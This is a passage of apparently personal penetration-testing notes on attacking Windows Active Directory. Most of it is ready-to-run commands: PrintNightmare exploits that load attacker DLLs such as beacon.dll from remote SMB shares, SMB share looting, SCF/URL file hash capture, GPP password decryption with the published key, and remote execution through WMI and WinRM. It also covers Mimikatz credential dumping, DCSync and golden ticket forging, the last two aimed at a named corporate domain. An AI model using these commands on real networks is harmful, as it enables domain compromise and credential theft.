  git clone https://github.com/byt3bl33d3r/ItWasAllADream
  cd ItWasAllADream && poetry install && poetry shell
  itwasalladream -u user -p password -d domain 192.168.1.0/24
  ```

**Trigger the exploit**: 

**NOTE**: The payload can be hosted on Impacket SMB server since [PR #1109](https://github.com/SecureAuthCorp/impacket/pull/1109):

    smbserver.py share /tmp/smb/`

* [SharpNightmare](https://github.com/cube0x0/CVE-2021-1675)

  # require a modified Impacket: https://github.com/cube0x0/impacket

    python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
    python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
 
## LPE

    SharpPrintNightmare.exe C:\addCube.dll

## RCE using existing context

    SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_addb31f9bff9e936\Amd64\UNIDRV.DLL' '\\192.168.1.20'

## RCE using runas /netonly

    SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll'  'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL' '\\192.168.1.10' hackit.local domain_user Pass123

* [Invoke-Nightmare](https://github.com/calebstewart/CVE-2021-1675)
  ```powershell
  ## LPE only (PS1 + DLL)
  Import-Module .\cve-2021-1675.ps1
  Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default
  Invoke-Nightmare -DriverName "Dementor" -NewUser "d3m3nt0r" -NewPassword "AzkabanUnleashed123*" 
  Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
  ```
* [Mimikatz v2.2.0-20210709+](https://github.com/gentilkiwi/mimikatz/releases)
  ```powershell
  ## LPE
  misc::printnightmare /server:DC01 /library:C:\Users\user1\Documents\mimispool.dll
  ## RCE
  misc::printnightmare /server:CASTLE /library:\\10.0.2.12\smb\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50
  ```

**Debug informations**

| Error  | Message             | Debug                                    |
|--------|---------------------|------------------------------------------|
| 0x5    | rpc_s_access_denied | Permissions on the file in the SMB share |
| 0x525  | ERROR_NO_SUCH_USER  | The specified account does not exist.    |
| 0x180  | unknown error code  | Share is not SMB2                        |


### Open Shares

> Some shares can be accessible without authentication, explore them to find some juicy files

* [smbmap](https://github.com/ShawnDEvans/smbmap)
  ```powershell
  smbmap -H 10.10.10.10                # null session
  smbmap -H 10.10.10.10 -R             # recursive listing
  smbmap -H 10.10.10.10 -u invaliduser # guest smb session
  smbmap -H 10.10.10.10 -d "DOMAIN.LOCAL" -u "USERNAME" -p "Password123*"
  ```

* [pth-smbclient from path-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
```powershell
  pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/Share
  pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/C$
  ls  # list files
  cd  # move inside a folder
  get # download files
  put # replace a file
```

* [smbclient from Impacket](https://github.com/SecureAuthCorp/impacket)
  ```powershell
  smbclient -I 10.10.10.100 -L ACTIVE -N -U ""
          Sharename       Type      Comment
          ---------       ----      -------
          ADMIN$          Disk      Remote Admin
          C$              Disk      Default share
          IPC$            IPC       Remote IPC
          NETLOGON        Disk      Logon server share
          Replication     Disk      
          SYSVOL          Disk      Logon server share
          Users           Disk
  use Sharename # select a Sharename
  cd Folder     # move inside a folder
  ls            # list files
  ```

* [smbclient - from Samba, ftp-like client to access SMB/CIFS resources on servers](AD%20exploitation.txt#)
  ```powershell
  smbclient -U username //10.0.0.1/SYSVOL
  smbclient //10.0.0.1/Share

  # Download a folder recursively
  smb: \> mask ""
  smb: \> recurse ON
  smb: \> prompt OFF
  smb: \> lcd '/path/to/go/'
  smb: \> mget *
  ```

### SCF and URL file attack against writeable share

Drop the following `@something.scf` file inside a share and start listening with Responder : `responder -wrf --lm -v -I eth0`

```powershell
[Shell]
Command=2
IconFile=\\10.10.10.10\Share\test.ico
[Taskbar]
Command=ToggleDesktop
```

This attack also works with `.url` files and `responder -I eth0 -v`.

```powershell
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\10.10.10.10\%USERNAME%.icon
IconIndex=1
```


### Passwords in SYSVOL & Group Policy Preferences

Find password in SYSVOL (MS14-025). SYSVOL is the domain-wide share in Active Directory to which all authenticated users have read access. All domain Group Policies are stored here: `\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.

```powershell
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
```

Decrypt a Group Policy Password found in SYSVOL (by [0x00C651E0](https://twitter.com/0x00C651E0/status/956362334682849280)), using the 32-byte AES key provided by Microsoft in the [MSDN - 2.2.1.1.4 Password Encryption](https://msdn.microsoft.com/en-us/library/cc422924.aspx)

```bash
echo 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000

e.g: 
echo '5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000

echo 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
```

#### Automate the SYSVOL and passwords research

* `Metasploit` modules to enumerate shares and credentials
    ```c
    scanner/smb/smb_enumshares
    post/windows/gather/enum_shares
    post/windows/gather/credentials/gpp
    ```

* CrackMapExec modules
    ```powershell
    cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_autologin
    cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_password
    ```

* [Get-GPPPassword](https://github.com/ShutdownRepo/Get-GPPPassword)
  ```powershell
  # with a NULL session
  Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'

  # with cleartext credentials
  Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

  # pass-the-hash
  Get-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
  ```

#### Mitigation : [(link)][1628741644800]
[1628741644800]: https://raw.githubusercontent.com/alisonocosta/PayloadsAllTheThings/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md

source:
https://adsecurity.org/?p=2398#WMIVSS
Remote Code Execution Options

There are several different ways to execute commands remotely on a Domain Controller, assuming they are executed with the appropriate rights. The most reliable remote execution methods involve either PowerShell (leverages WinRM) or WMI.

WMI
Wmic /node:COMPUTER/user:DOMAIN\USER /password:PASSWORD process call create “COMMAND“
PowerShell (WMI)
Invoke-WMIMethod -Class Win32_Process -Name Create –ArgumentList $COMMAND –ComputerName $COMPUTER -Credential $CRED
WinRM
winrs –r:COMPUTER COMMAND
PowerShell Remoting
Invoke-Command –computername $COMPUTER -command { $COMMAND}
New-PSSession -Name PSCOMPUTER –ComputerName $COMPUTER; Enter-PSSession -Name PSCOMPUTER




## Mimikatz 

sources and references:
https://adsecurity.org/?page_id=1821

This tool have to be executed in administrator mode

after that, some useful commands comes in:

verify privileges
	privilege::debug
dumping SAM database
	sekurlsa::logonpasswords
	
**OBS: ESse comando no windows 10 dá problema (null passwords appear). Precisa ser verificado o que deve ser feito para solucioná-lo**


## Dumping windows AD credentials

sources:
https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/

dumping a specific user
	lsadump::dcsync /user:claudio /domain:grupoamil.com.br
dumping all domain users in ad
	lsadump::dcsync /domain:grupoamil.com.br /all /csv



## Creating golden ticket

sources:
https://attack.stealthbits.com/how-golden-ticket-attack-works


first we have to get some informations with the following command:

SID from kerberos user
HASH NTLM from kerberos user

	lsadump::lsa /inject /name:krbtgt

![qownnotes-media-WIyHWu](../../media/27782.png)


kerberos::golden /domain:grupoamil.com.br /sid:<SID> /rc4:<ntlm-hash> /id:500 /user:<username> /ptt


## Pratical example
![qownnotes-media-dGnyMj](../../media/qownnotes-media-dGnyMj.png)


![qownnotes-media-JvUcaL](../../media/28224.png)

![qownnotes-media-JOZDqf](../../media/30458.png)

![qownnotes-media-DmuYjk](../../media/18346.png)

![qownnotes-media-MlCLth](../../media/13361.png)

![qownnotes-media-jilHUB](../../media/13642.png)

![qownnotes-media-igYAre](../../media/30372.png)


![qownnotes-media-upJvDC](../../media/23193.png)


![qownnotes-media-dZbQQI](../../media/5348.png)
